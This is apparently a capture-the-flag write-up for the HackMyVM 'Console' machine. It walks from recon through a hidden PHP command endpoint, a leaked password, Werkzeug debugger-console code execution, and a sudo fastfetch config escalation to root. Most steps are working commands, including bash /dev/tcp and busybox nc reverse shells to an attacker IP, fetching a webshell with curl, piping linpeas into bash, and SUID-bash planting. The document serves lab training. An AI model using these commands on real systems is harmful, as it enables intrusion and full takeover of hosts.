# Console

## Recon

::: details nmap_scan.log
```log
Open 10.0.2.33:22
Open 10.0.2.33:80
Open 10.0.2.33:443
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.33

PORT    STATE SERVICE  REASON  VERSION
22/tcp  open  ssh      syn-ack OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDRmicDuAIhDTuUUa37WCIEK2z2F1aDUtiJpok20zMzkbe1B41ZvvydX3JHjf7mgl0F/HRQlGHiA23Il+dwr0YbbBa2ggd5gDl95RSHhuUff/DIC10OFbP3YU8A4ItFb8pR6dN8jr+zU1SZvfx6FWApSkTJmeLPq9PN889+ibvckJcOMqrm1Y05FW2VCWn8QRvwivnuW7iU51IVz7arFe8JShXOLu0ANNqZEXyJyWjaK+MqyOK6ZtoWdyinEQFua81+tBZuvS+qb+AG15/h5hBsS/tUgVk5SieY6cCRvkYFHB099e1ggrigfnN4Kq2GvzRUYkegjkPzJFQ7BhPyxT/kDKrlVcLX54sXrp0poU5R9SqSnnESXVM4HQfjIIjTrJFufc2nBF+4f8dH3qtQ+jJkcPEKNVSKKEDULEk1BSBdokhh1GidxQY7ok+hEb9/wPmo6RBeb1d5t11SP8R5UHyI/yucRpS2M8hpBaovJv8pX1VwpOz3tUDJWCpkB3K8HDk=
|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBI2Hl4ZEYgnoDQflo03hI6346mXex6OPxHEjxDufHbkQZVosDPFwZttA8gloBLYLtvDVo9LZZwtv7F/EIiQoIHE=
|   256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILRLvZKpSJkETalR4sqzJOh8a4ivZ8wGt1HfdV3OMNY1
80/tcp  open  http     syn-ack Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: Console \xC2\xB7 \xE9\xBB\x91\xE5\xAE\xA2\xE7\x9A\x84\xE7\xAA\x97\xE5\x8F\xA3
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
443/tcp open  ssl/http syn-ack Apache httpd 2.4.62
|_http-server-header: Apache/2.4.62 (Debian)
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
|_http-title: 403 Forbidden
| ssl-cert: Subject: commonName=hacker.maze-sec.hmv/organizationName=Maze-Sec/stateOrProvinceName=Beijing/countryName=CN/localityName=Beijing/organizationalUnitName=IT
| Issuer: commonName=hacker.maze-sec.hmv/organizationName=Maze-Sec/stateOrProvinceName=Beijing/countryName=CN/localityName=Beijing/organizationalUnitName=IT
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-05-17T09:19:35
| Not valid after:  2035-05-15T09:19:35
| MD5:   67d3:8e24:4310:9dbe:b073:aec9:1393:b9e3
| SHA-1: 2eb3:f87f:cc69:3385:98d2:5562:1c62:7072:ff5d:4d5b
| -----BEGIN CERTIFICATE-----
| MIIDvzCCAqegAwIBAgIUKLX9soo2rhZ8aNlmsVVqFHviF7swDQYJKoZIhvcNAQEL
| BQAwbzELMAkGA1UEBhMCQ04xEDAOBgNVBAgMB0JlaWppbmcxEDAOBgNVBAcMB0Jl
| aWppbmcxETAPBgNVBAoMCE1hemUtU2VjMQswCQYDVQQLDAJJVDEcMBoGA1UEAwwT
| aGFja2VyLm1hemUtc2VjLmhtdjAeFw0yNTA1MTcwOTE5MzVaFw0zNTA1MTUwOTE5
| MzVaMG8xCzAJBgNVBAYTAkNOMRAwDgYDVQQIDAdCZWlqaW5nMRAwDgYDVQQHDAdC
| ZWlqaW5nMREwDwYDVQQKDAhNYXplLVNlYzELMAkGA1UECwwCSVQxHDAaBgNVBAMM
| E2hhY2tlci5tYXplLXNlYy5obXYwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEK
| AoIBAQDT/Nt/8MlUTtY/HNqttrub54zNvcDkEkjSM7jlJ/TARNtmChO5zdO52xU8
| TjVem98J8e/vQhNTVgsIoESr3xQFZQCgvLauFHD9ssIrRi0gD+hHsTnyyvwAC6EG
| oS0QM2Vpw//k6hcBmtdFz1p2XxN1/A+1q9OrNm1K/oJoUQBvqKSAdgC+2xPHiHBb
| Yno0GPv55blF5AzUDT5UHiV4vboOZc/BY+DvQI7uGFwnDiXMzKnToJGEOn2HC5dV
| 3CkUl/uwff5TL6lE+q9k0Jn3ld5ljgZRdB8SuRKWIEOBfs24A7iNLD+qKbBqD3hn
| rrAEwiSYTcebFkUALvUCt6at334FAgMBAAGjUzBRMB0GA1UdDgQWBBTlXWcEMjrm
| iEiXOF2k2ht0Q3X2SjAfBgNVHSMEGDAWgBTlXWcEMjrmiEiXOF2k2ht0Q3X2SjAP
| BgNVHRMBAf8EBTADAQH/MA0GCSqGSIb3DQEBCwUAA4IBAQDKAjtHlAn7jq0u8pPM
| 2seemksNmJYk50Am6wbZXp/q6UF5SmtTYTBcuRFXpbWNVi8USX4LWsNo9ZllOrFr
| FA1+1JKdRsoLW+rinQKqx0udurt7sVTSf6jKOzQz2DrfprKXlv/uib6wHjZaAwhh
| S1djr4gjKkhliBzcI6PAB9cnt5gFvZFkA7e469+R8vY6YyWkkize6a2jkGwF74oE
| 91cOnYQGUNsgeQlRNHoxqvSxg8h3brAptQdjcRuPomGbqQ99ASzFYZqgt8k7fevC
| joofp35qy3tdVwW7PN8iiwOBaZ2GMtHTezOHTvMI5Ey8u62vKdnWL0OmtNgK7AFj
| Alno
|_-----END CERTIFICATE-----
Service Info: Host: hacker.maze-sec.hmv; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP

Static page with some text

![writeup.png](/assets/pentest/hackmyvm/console/writeup.png)

Fancy page with static html

![writeup-1.png](/assets/pentest/hackmyvm/console/writeup-1.png)

Nothing from fuzzing except HTML
```bash
└─$ feroxbuster -u http://maze-sec.hmv/ -w /usr/share/seclists/Discovery/Web-Content/common.txt --thorough -D -C 404,400,403,500 --dont-scan js,css,png,jpeg,jpg,gif -n -x .php,.txt,.html
└─$ feroxbuster -u http://maze-sec.hmv/ -w /usr/share/seclists/Discovery/Web-Content/common.txt --thorough -D -C 404,400,403,500 --dont-scan js,css,png,jpeg,jpg,gif -n -x .php,.txt,.html
```

This definitely screams PHP, if we do global search (**Ctrl+Shift+F**) in Webtools Inspector and search for `PHP` something interesting is found

![writeup-2.png](/assets/pentest/hackmyvm/console/writeup-2.png)

### RCE

```bash
└─$ curl -k 'https://hacker.maze-sec.hmv/supercoool.php?cmd=id'
<pre>uid=33(www-data) gid=33(www-data) groups=33(www-data)
</pre> 
```

The usual payload for `bash -i` reverse shell just hangs, as well as `busybox`... Hmm `curl` does make connection so what's wrong...?
```bash
└─$ curl -k 'https://hacker.maze-sec.hmv/supercoool.php' -G --data-urlencode 'cmd=/bin/bash -c "/bin/bash -i >& /dev/tcp/10.0.2.15/4444 0>&1"'
└─$ curl -k 'https://hacker.maze-sec.hmv/supercoool.php' -G --data-urlencode 'cmd=busybox nc 10.0.2.15 4444 -e /bin/bash'
└─$ curl -k 'https://hacker.maze-sec.hmv/supercoool.php' -G --data-urlencode $'cmd=php -r \'$sock=fsockopen("10.0.2.15",4444);`/bin/bash <&3 >&3 2>&3`;\''
```

No reverse shell, so I guess we will be using webshell (the file itself, cuz we can't write `/var/www/hacker.maze-sec.hmv`)

Actually scratch that, we can write to `/var/www/html` (HTTP)
```bash
└─$ curl -k 'https://hacker.maze-sec.hmv/supercoool.php' -G --data-urlencode 'cmd=curl 10.0.2.15/shell.php -o /var/www/html/shell.php 2>&1'
```

![writeup-3.png](/assets/pentest/hackmyvm/console/writeup-3.png)

We can read `welcome` user home directory, looks like vim contains password.
```bash
www-data@Console:…/www/html# find /home -type f -ls
find: '/home/qaq/.local/share': Permission denied
   527371      4 -rw-r--r--   1 qaq      qaq           220 Apr 18  2019 /home/qaq/.bash_logout
   527372      4 -rw-r--r--   1 qaq      qaq          3526 Apr 18  2019 /home/qaq/.bashrc
find: '/home/qaq/.ssh': Permission denied
   527373      4 -rw-r--r--   1 qaq      qaq           807 Apr 18  2019 /home/qaq/.profile
   527366      4 -rw-r--r--   1 welcome  welcome       220 Apr 11 22:27 /home/welcome/.bash_logout
   527367      4 -rw-r--r--   1 welcome  welcome      3526 Apr 11 22:27 /home/welcome/.bashrc
   527407      4 -rw-r--r--   1 root     root           44 May 17 06:01 /home/welcome/user.txt
   527368      4 -rw-r--r--   1 welcome  welcome       807 Apr 11 22:27 /home/welcome/.profile
   527402      4 -rw-r--r--   1 root     root           19 May 16 10:48 /home/welcome/.viminfo

www-data@Console:…/www/html# cat /home/welcome/.viminfo
welcome:welcome123
```

## SSH 

```bash
└─$ sshpass -p 'welcome123' ssh welcome@maze-sec.hmv
welcome@Console:~$ id
uid=1000(welcome) gid=1000(welcome) groups=1000(welcome)
```

### User.txt

```bash
welcome@Console:~$ cat user.txt
flag{user-376760a7c739a606d4f8d8340bad4184}
```

## Privilege Escalation (qaq)

```bash
welcome@Console:~$ sudo -l
Matching Defaults entries for welcome on Console:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User welcome may run the following commands on Console:
    (qaq) PASSWD: /bin/cat /opt/flask-app/logs/flask.log

welcome@Console:~$ sudo -u qaq /bin/cat /opt/flask-app/logs/flask.log

 * Serving Flask app 'app'
 * Debug mode: on
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:5000
 * Running on http://10.0.2.33:5000
Press CTRL+C to quit
 * Restarting with stat
 * Debugger is active!
 * Debugger PIN: 370-400-669
   
welcome@Console:~$ ps aux | grep flask
qaq          466  0.0  1.3  35456 28036 ?        S    15:39   0:01 /opt/flask-app/venv/bin/python3 /opt/flask-app/app.py
qaq          467  0.5  1.3 182948 28476 ?        Sl   15:39   0:12 /opt/flask-app/venv/bin/python3 /opt/flask-app/app.py
welcome     1343  0.0  0.0   6176   700 pts/0    S+   16:19   0:00 grep flask
```

Debug pin? :nom-nom-nom:

[https://woyag.gitbook.io/blog/ctfs/2025/idex.ctf.ae/2025-03-05-xyz-e-municipality#solution](https://woyag.gitbook.io/blog/ctfs/2025/idex.ctf.ae/2025-03-05-xyz-e-municipality#solution)

> Yes, you can port forward with `-L 5000:0:5000`, but why? When you can use curl!

```bash
# Get SECRET value
welcome@Console:~$ curl 127.0.0.1:5000/console -s | grep SECRET
          SECRET = "1kIgsIFQnaB7tExZTL1y";

# Get auth token
welcome@Console:~$ curl '127.0.0.1:5000/console?__debugger__=yes&cmd=pinauth&pin=370-400-669&s=1kIgsIFQnaB7tExZTL1y' -is | grep Cookie
Set-Cookie: __wzde8bcf903948a6d76ff70=1756758886|25f4f2a0ed0d; HttpOnly; Path=/; SameSite=Strict

# Execute commands via `cmd` parameter
welcome@Console:~$ curl '127.0.0.1:5000/console?&__debugger__=yes&frm=0&s=1kIgsIFQnaB7tExZTL1y' -b '__wzde8bcf903948a6d76ff70=1756758886|25f4f2a0ed0d' -G --data-urlencode 'cmd=print(__import__("subprocess").check_output("id"))'
>>> print(__import__(&#34;subprocess&#34;).check_output(&#34;id&#34;))
b&#39;uid=1001(qaq) gid=1001(qaq) groups=1001(qaq)\n&#39;

welcome@Console:~$ curl '127.0.0.1:5000/console?&__debugger__=yes&frm=0&s=1kIgsIFQnaB7tExZTL1y' -b '__wzde8bcf903948a6d76ff70=1756758886|25f4f2a0ed0d' -G --data-urlencode 'cmd=print(__import__("subprocess").run("find . -ls", shell=True, capture_output=True, text=True))' -s | sed 's/\\n/\n/g'
>>> print(__import__(&#34;subprocess&#34;).run(&#34;find . -ls&#34;, shell=True, capture_output=True, text=True))
CompletedProcess(args=&#39;find . -ls&#39;, returncode=1, stdout=&#39;   527370      4 drwxr-xr-x   4 qaq      qaq          4096 May 17 05:38 .
   527404      4 drwxr-xr-x   3 qaq      qaq          4096 May 16 10:17 ./.local
   527405      4 drwx------   3 qaq      qaq          4096 May 16 10:17 ./.local/share
   527406      4 drwx------   2 qaq      qaq          4096 May 16 10:17 ./.local/share/nano
   527371      4 -rw-r--r--   1 qaq      qaq           220 Apr 18  2019 ./.bash_logout
   527372      4 -rw-r--r--   1 qaq      qaq          3526 Apr 18  2019 ./.bashrc
   527364      4 drwx------   2 root     root         4096 May 17 04:16 ./.ssh
   527373      4 -rw-r--r--   1 qaq      qaq           807 Apr 18  2019 ./.profile
&#39;, stderr=&#39;find: ‘./.ssh’: Permission denied
&#39;)
```

I wanted to get or write ssh keys, but it's only owned by root

Still no reverse shell, crazy
```bash
welcome@Console:~$ curl 'http://127.0.0.1:5000/console?__debugger__=yes&frm=0&s=1kIgsIFQnaB7tExZTL1y' -b '__wzde8bcf903948a6d76ff70=1756758886|25f4f2a0ed0d' -G --data-urlencode 'cmd=__import__("subprocess").run("bash -c \"bash -i >& /dev/tcp/10.0.2.15/4444 0>&1\"", shell=True)'
```

We can use `bash -p` to become `qaq` user.
```bash
welcome@Console:~$ run() { curl '127.0.0.1:5000/console?&__debugger__=yes&frm=0&s=1kIgsIFQnaB7tExZTL1y' -b '__wzde8bcf903948a6d76ff70=1756758886|25f4f2a0ed0d' -G --data-urlencode 'cmd=print(__import__("html").unescape(__import__("subprocess").run("'"$1"'",shell=True,capture_output=True,text=True).stdout))' -s | sed 's/\\n/\n/g' | grep -v '^>>>'; }

welcome@Console:~$ run id
uid=1001(qaq) gid=1001(qaq) groups=1001(qaq)

welcome@Console:~$ run "install -m4777 /bin/bash /tmp/qaqbash"

welcome@Console:~$ /tmp/qaqbash -p
qaqbash-5.0$ id
uid=1000(welcome) gid=1000(welcome) euid=1001(qaq) groups=1000(welcome)
```

```bash
qaqbash-5.0$ curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | bash | tee /tmp/lp.log
...
══╣ Polkit Binary
Pkexec binary found at: /usr/bin/pkexec
Pkexec binary has SUID bit set!
-rwsr-xr-x 1 root root 23448 Jan 13  2022 /usr/bin/pkexec
...
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid
strace Not Found
-rwsr-xr-x 1 root root 44K Jul 27  2018 /usr/bin/chsh
-rwsr-xr-x 1 root root 53K Jul 27  2018 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 44K Jul 27  2018 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 83K Jul 27  2018 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 47K Apr  6  2024 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 63K Apr  6  2024 /usr/bin/su
-rwsr-xr-x 1 root root 35K Apr  6  2024 /usr/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 23K Jan 13  2022 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)/Generic_CVE-2021-4034
-rwsr-xr-x 1 root root 179K Jan 14  2023 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 63K Jul 27  2018 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-- 1 root messagebus 51K Jun  6  2023 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 10K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 471K Dec 21  2023 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 19K Jan 13  2022 /usr/libexec/polkit-agent-helper-1
You can write SUID file: /tmp/qaqbash
╔══════════╣ SGID
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid
-rwxr-sr-x 1 root shadow 39K Feb 14  2019 /usr/sbin/unix_chkpwd
-rwxr-sr-x 1 root ssh 347K Dec 21  2023 /usr/bin/ssh-agent
-rwxr-sr-x 1 root shadow 71K Jul 27  2018 /usr/bin/chage
-rwxr-sr-x 1 root shadow 31K Jul 27  2018 /usr/bin/expiry
-rwxr-sr-x 1 root tty 15K May  4  2018 /usr/bin/bsd-write
-rwxr-sr-x 1 root crontab 43K Oct 11  2019 /usr/bin/crontab
╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 200)
...
/usr/local/bin/irc_bot.py
...
```

Nothing much... SUID pkexec doesn't help and `irc_bot.py` is not even running.

We need a proper TTY session to use `sudo`, however with `bash -p` we are still `welcome` user. The TCP connections for port 4444 are blocked, but not 80 or 443. If we listen on 443 (or any whitelisted ports) we get a reverse shell! (finally)
```bash
welcome@Console:~$ run "busybox nc 10.0.2.15 443 -e /bin/bash"
```

## Privilege Escalation (root)

```bash
└─$ penelope -p 443
qaq@Console:~$ sudo -l
Matching Defaults entries for qaq on Console:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User qaq may run the following commands on Console:
    (ALL) NOPASSWD: /usr/bin/fastfetch
```

We can specify the config to use, docs: [https://github.com/fastfetch-cli/fastfetch/wiki/Json-Schema#51216-property-json-config--modules--modules-items--anyof--item-1--oneof--command](https://github.com/fastfetch-cli/fastfetch/wiki/Json-Schema#51216-property-json-config--modules--modules-items--anyof--item-1--oneof--command)

```bash
qaq@Console:~$ echo '{"modules": [{"type": "command", "text": "id"}]}' > config.jsonc
qaq@Console:~$ sudo /usr/bin/fastfetch -c config.jsonc
       _,met$$$$$gg.           Command: uid=0(root) gid=0(root) groups=0(root)
...
```

```bash
qaq@Console:~$ echo '{"modules": [{"type": "command", "text": "install -m4777 /bin/bash /tmp/rootbash"}]}' > config.jsonc
qaq@Console:~$ sudo /usr/bin/fastfetch -c config.jsonc
qaq@Console:~$ /tmp/rootbash -p
rootbash-5.0# id
uid=1001(qaq) gid=1001(qaq) euid=0(root) groups=1001(qaq)
```
### Root.txt

```
rootbash-5.0# cat /root/r00t.txt
flag{root-009de5ebccb9fdecce2c4ac893bca6fa}
```